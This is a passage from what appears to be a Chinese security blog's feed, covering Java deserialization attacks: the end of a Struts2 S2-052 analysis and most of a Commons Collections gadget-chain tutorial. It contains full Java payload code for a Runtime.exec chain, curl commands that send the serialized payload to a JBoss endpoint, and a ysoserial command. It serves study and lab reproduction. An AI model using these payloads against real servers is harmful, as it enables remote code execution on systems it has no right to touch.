title="弹出计算器"></a>弹出计算器</h2><p>选一个先前Burpsuite抓到的Post包，将content-type改为application/xml，body部分改为上面生成的paylod，放之后服务器报错并且弹出计算器：</p><p><img src="/反序列化-Struts2-052反序列化漏洞分析/1546073207368.png" alt="1546073207368"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先看org.apache.struts2.rest.ContentTypeInterceptor.intercept()方法，它是客户端每次发送html请求的入口：</p><p><img src="/反序列化-Struts2-052反序列化漏洞分析/1546074867834.png" alt="1546074867834"></p><p>向下调两步，可以看到selector对application/xml选择的handler是XStreamHandler，再看到60行，它调用了XStreamHandler.toObject方法，这里跟进去看一下：</p><p><img src="/反序列化-Struts2-052反序列化漏洞分析/1546074203978.png" alt="1546074203978"></p><p>调用XStream.fromXML():</p><p><img src="/反序列化-Struts2-052反序列化漏洞分析/1546074176680.png" alt="1546074176680"></p><p>umarshal是一个将已经序列化的xml文本反序列化成Java对象的函数，而先前的marshalsec就是将装配好POP链的类序列化成xml。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://www.zerokeeper.com/vul-analysis/analysis-of-struts2-s2052-vulnerability.html" title="struts2 s2-052 漏洞分析" target="_blank" rel="noopener">struts2 s2-052 漏洞分析</a></li><li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全-反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化2：Commons Collections Java反序列化漏洞与POP Gadgets</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EPOP-Gadgets/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Commons-Collections-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EPOP-Gadgets/</url>
      
        <content type="html"><![CDATA[<p>利用Commons Collections攻击反序列化漏洞由FoxGlove Security团队首次提出，也是我们第一次看到反序列化类型漏洞的利用，而其整个利用过程后来也被成为面向属性编程（POP），虽然事隔久远，但是还是参考先前<a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Java反序列化漏洞深入分析," target="_blank" rel="noopener">大佬们的研究</a>学习一下。</p><h1 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h1><a id="more"></a><p>Apache Commons Collections（以下代码使用commons-collections-3.2.1.jar）拓展了Java原生Collection结构的第三方库，其中有一个TransformedMap类是本文的研究对象。它可以装饰一个基本Map，返回一个TransformedMap，当新元素加入TransformedMap时会对元素进行预先定义的变换（Transformer），比如说有如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">"concat"</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">        new Object[]&#123;"transformed"&#125; );</span><br><span class="line">Map transformMap = TransformedMap.decorate(map, <span class="keyword">null</span>, invokerTransformer);</span><br><span class="line">transformMap.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">transformMap.forEach((key, value) -&gt; System.out.println(key + <span class="string">":"</span> + value + <span class="string">"\n"</span>));</span><br></pre></td></tr></table></figure><p>执行后结果为：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546088911400.png" alt="1546088911400"></p><p>注意到InvokerTransformer类，它让我们通过反射的方法调用任意对象的任意方法，其构造函数第一个参数是元素的方法（<code>&quot;concat&quot;</code>），第二个参数是方法的参数类型数组（<code>new Class[]{String.class}</code>），第三个参数是具体参数值（<code>new Object[]{&quot;transformed&quot;}</code>），在上面代码的Transfer实际上是调用了<code>value.concat(&quot;transformed&quot;)</code>方法。</p><p>具体来说，对于每个put进来的value——更准确的说是setValue()——都会触发TransformedMap.checkSetValue()：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546157968457.png" alt="1546157968457"></p><p>该操作最终触发invokerTransformer.transform()：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546157830173.png" alt="1546157830173"></p><p>invokerTransformer.transform()演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer Usage</span></span><br><span class="line">InvokerTransformer invokerTransformer1 = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">    <span class="string">"concat"</span>,</span><br><span class="line">    <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">    new Object[]&#123;"transformed"&#125; );</span><br><span class="line">Object result = invokerTransformer1.transform(<span class="string">"raw"</span>) ;</span><br><span class="line">System.out.printf(result.toString());</span><br><span class="line"><span class="comment">// 输出 rawtransformed</span></span><br></pre></td></tr></table></figure><h2 id="使用transform弹出计算器"><a href="#使用transform弹出计算器" class="headerlink" title="使用transform弹出计算器"></a>使用transform弹出计算器</h2><p>如果我们transform的对象就是Runtime，那情况就很好办了，直接调用它的exec(“calc”)方法就行了：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546089796235.png" alt="1546089796235"></p><h2 id="构造Transformer链"><a href="#构造Transformer链" class="headerlink" title="构造Transformer链"></a>构造Transformer链</h2><p>但是TransformedMap正常情况下不会去放Runtime类型（就像文章开头代码那样，可能是字符串或其他类型），那么就需要构造一个Transformer链，先获得Runtime类，再执行exec()方法。</p><p>这里需要用到另一个Transformer类——ConstantTransformer，它的功能是直接将key/value替换成另一个对象：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546090891949.png" alt="1546090891949"></p><p>如上图所示，这里我们还是用了一个TransformerChain，TransformedMap允许我们定义一个Transformer链，上一个Transformer的结果再传递给下一个Transformer，这样我们就可以构造一个恶意的链来弹计算器了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilTransformer2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// InvokerTransformer Usage</span></span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">// Runtime</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                // (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line">                <span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line">                <span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line">                <span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"calc"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">        Map transformMap = TransformedMap.decorate(map, <span class="keyword">null</span>, evilTransformerChain);</span><br><span class="line">        transformMap.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">        transformMap.forEach((key, value) -&gt; System.out.println(key + <span class="string">":"</span> + value + <span class="string">"\n"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个Chain实际上就是执行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span><br></pre></td></tr></table></figure><p>同样可以弹出计算器。</p><h1 id="Annotation-Invocation-Handler"><a href="#Annotation-Invocation-Handler" class="headerlink" title="Annotation Invocation Handler"></a>Annotation Invocation Handler</h1><p>假设有一个不安全的反序列化函数，我们如何借助Apache Commons Collections进行命令执行呢？</p><p>我们知道我们传入的类必须是程序里面已经存在的类（这已经在第一篇里验证），因此我们就需要找一个类，它满足两个条件：1）该类存在于那个不安全的反序列化应用中；2）该类的readObject()调用了先前讨论的transformMap.checkSetValue()。这样我们就可以在构造一个恶意类让其反序列化，接着它调用setValue方法，就可以执行我们的代码了。</p><p>于是我们的目光转移到了Annotation Invocation Handler，可以看到在其属性memberValues不为空的情况下，会执行setValue方法：</p><p><strong>注意：高版本的java已经修复了这一问题，如需复现使用jdk8u66及以前版本</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 此处触发一系列的Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是我们可以实例化一个AnnotationInvocationHandler类，先设置一个不为空的map，再将其用先前的Transformer装饰，再将其序列化，给不安全的反序列化函数读取，这样就可以进行任意代码执行了：</p><p>考虑通过<code>if (memberType != null)</code>,经过事后调试可以知道memberTypes中存在一个<code>&lt;&quot;value&quot;, java.lang.annotation.RetentionPolicy&gt;</code>的键值对，所以我们构造payload时，需要保证<code>name=&quot;value&quot;</code>即<code>key=“value&quot;</code>。</p><p>考虑通过第二个<code>if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy))</code>，即保证两者都不满足，这很简单，传入的map中value不要是以上两种类型即可。</p><p>根据上述思路，可以产生如下payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PayloadTransformedMap</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">// (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line"><span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line"><span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line"><span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line"><span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">new Object[]&#123;"calc"&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innermap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">Map outermap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, evilTransformerChain);</span><br><span class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//返回"sun.reflect.annotation.AnnotationInvocationHandler"对象</span></span><br><span class="line">Object instance = ctor.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outermap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">out.writeObject(instance);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">Object o=in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">        payloadTest();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">// 这里为测试上面的tansform是否会触发payload</span></span><br><span class="line"><span class="comment">// Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();</span></span><br><span class="line"><span class="comment">// onlyElement.setValue("foobar");</span></span><br><span class="line"></span><br><span class="line">ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，得到反序列化文件<code>payload.ser</code>。</p><h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><p>下面找一个不安全的反序列化入口吧，一般Java的RMI（远程方法调用）或是其他服务都不免用到反序列化。在org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)就存在一个不安全的反序列化入口：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546160655463.png" alt="1546160655463"></p><p>在JBoss网站<a href="http://jbossas.jboss.org/downloads/上下载一个存在漏洞的jboss（以版本6.1为例），在虚拟机中安装一个低版本的java（8u66)，再运行jboss" target="_blank" rel="noopener">http://jbossas.jboss.org/downloads/上下载一个存在漏洞的jboss（以版本6.1为例），在虚拟机中安装一个低版本的java（8u66)，再运行jboss</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\anemone\Desktop\jboss<span class="literal">-6</span>.<span class="number">1.0</span>.Final\bin&gt; ./run.bat <span class="literal">-b</span> <span class="number">0.0</span>.<span class="number">0.0</span></span><br></pre></td></tr></table></figure><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546173400906.png" alt="1546173400906"></p><p>接着尝试触发Payload，这里假设server地址为192.168.80.141：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">λ curl http://192.168.80.141:8080/invoker/<span class="built_in">readonly</span> --data-binary @payload.ser</span><br></pre></td></tr></table></figure><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546172924442.png" alt="1546172924442"></p><p>可以看到计算器被弹出。</p><h1 id="面向属性编程——POP"><a href="#面向属性编程——POP" class="headerlink" title="面向属性编程——POP"></a>面向属性编程——POP</h1><p>它类似于ROP（面向返回编程），搞PWN的都知道为了绕过堆栈不可执行往往会利用一些程序中已有的代码片段（gadgets)，将这些片段拼凑起来形成gadgets chain完成功能。</p><p>POP 的gadgets chain寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。以前面讲到的POC来说，构造的POP gadgats链为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    AnnotationInvocationHandler.readObject()</span><br><span class="line">        AbstractInputCheckedMapDecorator$MapEntry.setValue()</span><br><span class="line">            TransformedMap.checkSetValue()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections6-amp-LazyMap"><a href="#CommonsCollections6-amp-LazyMap" class="headerlink" title="CommonsCollections6 &amp; LazyMap"></a>CommonsCollections6 &amp; LazyMap</h1><p>java的高版本（8u151+）修改了AnnotationInvocationHandler，导致我们的POP链失效，这时我们就要寻找新的POP，不过原理都是一样的。</p><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>这里我们使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>工具的CommonsCollections6 POP链生成Payload，可以exploit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ java -jar ysoserial.jar CommonsCollections6 <span class="string">"calc"</span> &gt; payload.ser</span><br><span class="line">λ curl http://127.0.0.1:8080/invoker/<span class="built_in">readonly</span> --data-binary @payload.ser</span><br></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>可以看到序列化对象的Payload为CommonsCollections6.java，改写一下变成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span 